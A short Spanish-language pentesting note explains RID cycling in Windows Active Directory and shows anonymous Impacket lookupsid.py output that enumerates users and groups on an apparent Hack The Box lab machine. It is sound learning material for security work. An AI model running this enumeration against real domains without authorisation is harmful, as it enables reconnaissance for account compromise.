# RID cycling attack


### Definición RID/SID

- En un entorno Windows, cada cuenta (ya sea de usuario, grupo, etc.) tiene un identificador de seguridad único (SID). Este SID está compuesto por una parte fija (que identifica al dominio) y una parte variable denominada Relative Identifier (RID). Los RIDs se **asignan de forma incremental para cada cuenta nueva**. Por ejemplo, el primer usuario creado en el dominio podría tener un RID bajo, mientras que otros usuarios tendrán RIDs mayores.

## El ataque en sí

- Enumerar cuentas de usuario: Se recorre secuencialmente (o en un rango específico) los RIDs para interrogar al controlador de dominio y obtener el nombre de la cuenta asociada a cada uno.

- Identificar nombres de usuario o cultos o con privilegios altos: Muchas veces, se puede descubrir un usuario con privilegios especiales o una cuenta con configuraciones particulares que resulten útiles para la explotación.

### Ejemplo sin credenciales

```bash

┌──(kali㉿kali)-[~/Desktop/boxes/manager]
└─$ lookupsid.py anonymous@manager.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at manager.htb
[*] StringBinding ncacn_np:manager.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: MANAGER\Administrator (SidTypeUser)
501: MANAGER\Guest (SidTypeUser)
502: MANAGER\krbtgt (SidTypeUser)
512: MANAGER\Domain Admins (SidTypeGroup)
513: MANAGER\Domain Users (SidTypeGroup)
514: MANAGER\Domain Guests (SidTypeGroup)
515: MANAGER\Domain Computers (SidTypeGroup)
516: MANAGER\Domain Controllers (SidTypeGroup)
517: MANAGER\Cert Publishers (SidTypeAlias)
518: MANAGER\Schema Admins (SidTypeGroup)
519: MANAGER\Enterprise Admins (SidTypeGroup)
520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
525: MANAGER\Protected Users (SidTypeGroup)
526: MANAGER\Key Admins (SidTypeGroup)
527: MANAGER\Enterprise Key Admins (SidTypeGroup)
553: MANAGER\RAS and IAS Servers (SidTypeAlias)
571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
1000: MANAGER\DC01$ (SidTypeUser)
1101: MANAGER\DnsAdmins (SidTypeAlias)
1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)
``` 